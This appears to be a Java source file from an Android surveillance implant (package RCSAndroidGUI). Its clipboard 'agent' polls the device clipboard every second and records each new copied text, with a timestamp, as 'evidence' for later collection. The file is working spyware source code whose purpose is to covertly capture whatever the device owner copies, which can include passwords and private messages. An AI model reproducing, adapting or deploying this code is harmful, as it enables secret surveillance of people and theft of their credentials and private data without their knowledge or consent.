package com.ht.RCSAndroidGUI.agent;

import java.util.Date;

import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.evidence.Evidence;
import com.ht.RCSAndroidGUI.evidence.EvidenceType;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.DateTime;
import com.ht.RCSAndroidGUI.util.WChar;

import android.content.Context;
import android.text.ClipboardManager;
import android.util.Log;

public class AgentClipboard extends AgentBase {
	private static final String TAG = "AgentClipboard";

	ClipboardManager clipboardManager;
	String lastClip = "";

	@Override
	public boolean parse(AgentConf conf) {
		setPeriod(1000);
		return true;
	}

	@Override
	public void go() {

		String ret = clipboardManager.getText().toString();
		if (ret != null && !ret.equals(lastClip)) {
			Log.d("QZ", TAG + " (go): captured " + ret);
			saveEvidence(ret);
			lastClip = ret;
		}
	}

	private void saveEvidence(String ret) {
		DateTime now = new DateTime();
		byte[] tm = now.getStructTm();
		byte[] payload = WChar.getBytes(ret.toString(), true);
		byte[] process = WChar.getBytes("Main", true);
		byte[] window = WChar.getBytes("Main", true);

		int size = tm.length + payload.length + process.length + window.length + 4;
		final byte[] message = new byte[size];

		final DataBuffer databuffer = new DataBuffer(message, 0, size);

		databuffer.write(tm);
		databuffer.write(process);
		databuffer.write(window);
		// payload
		databuffer.write(payload);

		// delimiter
		databuffer.writeInt(Evidence.EVIDENCE_DELIMITER);

		new LogR(EvidenceType.CLIPBOARD, null, message);
		
		byte last = message[message.length-1];
		Check.ensures(message[message.length-1] == (byte) 0xab , "Wrong delmiter");
	}

	@Override
	public void begin() {
		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
		Check.ensures(clipboardManager != null, "Null clipboard manager");
	}

	@Override
	public void end() {
		clipboardManager = null;
	}

}
